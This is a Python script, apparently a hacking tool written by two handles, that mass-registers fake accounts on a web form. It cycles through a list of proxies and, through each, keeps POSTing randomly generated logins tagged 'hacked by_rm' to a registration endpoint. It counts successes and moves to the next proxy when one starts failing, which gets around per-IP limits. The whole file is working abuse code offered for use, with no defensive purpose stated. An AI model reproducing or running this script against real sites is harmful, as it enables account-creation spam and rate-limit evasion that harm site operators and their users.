# -- luisfeliperm --
# -- JustAbP      --
import requests
import socket
import random
import string
import re

headers = {
    'User-Agent': 'Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
    'From': 'rm@gmaail.com'
}
filename='proxy.txt'
letras = string.ascii_lowercase
criada = 0
proxy_line = 0
i = 0
for proxy in open(filename,'r').readlines():
	i += 1
	proxy_line += 1
	proxy=proxy.strip()
	ipProxy   = proxy.split(':')[0]
	portProxy = int(proxy.split(':')[1])
	erroPorIp = 0
	DerroPorIp = 0

	proxies = {
	   'http': proxy,
	   'https': proxy
	}
	url = "http://127.0.0.1/cadastrar/"

	try:
		proxy_test=socket.socket(socket.AF_INET, socket.SOCK_STREAM);
		proxy_test.connect_ex((ipProxy,portProxy))

		ii = 0
		while True:
			ii += 1
			rand1 = random.randint(0,9)
			codigo = ''.join(random.choice(letras) for _ in range(5))
			codigo2 = ''.join(random.choice(letras) for _ in range(8))
			login = str(rand1)+'-hacked'+str(criada)+'by_rm'+codigo+str(i)+str(ii)
			email = 'rm-'+codigo+str(i)+str(ii)+'@'+codigo2+str(rand1)+'vuln.xxx'
			senha = 'senha123'
			
			post = {
				'input_login': login,
				'input_pass': senha, 
				'input_passconf': senha, 
				'input_email':  email
			}

			try:
				r = requests.post(url, data=post,proxies=proxies,timeout=20,headers=headers) 

				if re.search('Registrado com sucesso', r.text, re.IGNORECASE):
				  	criada += 1
				  	status = "Success"
				  	print('>',str(i)+'.'+str(ii), ' Login: ', login,'Senha: ',senha, ' Email: ',email,r.status_code, '[',str(criada),']', status)
				else:
					erroPorIp += 1
					print(''+str(erroPorIp)+' Tentativas com o ip '+proxy+' Falharam')
					if erroPorIp > 2:
						break

			except:
				DerroPorIp += 1
				print('('+str(i)+'.'+str(ii)+') '+proxy+' Erro ao enviar POST - Desconhecido')
				if DerroPorIp > 10:
					break
		
	except:
		print('Proxy: '+proxy+' falhou! -- Arquivo linha: '+str(proxy_line))
	
	
	
